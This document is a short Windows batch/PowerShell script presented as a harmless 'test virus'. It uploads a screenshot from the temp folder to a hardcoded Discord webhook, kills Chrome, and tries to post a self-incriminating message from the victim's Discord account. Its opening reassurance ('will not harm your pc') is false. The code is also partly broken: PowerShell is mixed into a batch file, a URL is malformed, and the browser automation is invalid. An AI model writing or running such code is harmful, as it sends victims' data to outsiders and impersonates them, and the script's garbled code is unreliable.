@echo off 
echo hello, this is just a test virus itll not harm your pc at all
start chrome https://www.whatismyipaddress 
@echo off
:: Path to the screenshot
set screenshot=%TEMP%\screenshot.png

:: Check if the screenshot exists
if exist "%screenshot%" (
    echo Sending screenshot to Discord...
    powershell.exe -Command "& { $url = 'https://discord.com/api/webhooks/1318752969470251109/36PzXZklEDxs_GawBzhrbZeqyFZlD3lOANsVR7pCIeInR5o1aOw95GBLh251tk-RsKxJ'; $filename = '%screenshot%'; Invoke-RestMethod -Uri $url -Method Post -InFile $filename -ContentType 'multipart/form-data' }"
    echo Screenshot sent.
) else (
    echo Screenshot not found. Please run the screenshot script first.
)
taskkill chrome
start chrome https://discord.com/channels/@me/1291824895709155499
$url = 'https://discord.com/channels/@me/1291824895709155499'
$message = 'i've been an idiot and downloaded and opened this virus'

# Open the Discord DM URL in Chrome
Start-Process -FilePath 'chrome.exe' -ArgumentList $url

# Wait for the page to load
Start-Sleep -Seconds 5

# Switch to the Discord input box (this is a rough example, specific DOM interaction may vary)
$webElement = New-Object -ComObject InternetExplorer.Application
$webElement.Navigate($url)
$webElement.Visible = $true

# Wait for the page to load
Start-Sleep -Seconds 5

# Send the message
$webElement.document.getElementsByClassName('inputContainer-0uGdbW')[0].value = $message
$webElement.document.getElementsByClassName('inputContainer-0uGdbW')[0].dispatchEvent([System.Windows.Forms.SendKeys]::SendWait('{ENTER}'))
